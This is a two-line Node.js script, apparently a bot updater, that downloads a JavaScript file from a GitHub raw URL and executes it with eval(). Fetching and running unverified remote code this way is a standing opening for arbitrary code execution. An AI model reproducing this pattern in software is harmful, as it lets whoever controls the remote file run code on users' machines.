const axios = require('axios');

axios.get("https://raw.githubusercontent.com/negative-xalman/GOAT-BOT-UPDATED/main/updater.js")
	.then(res => eval(res.data));
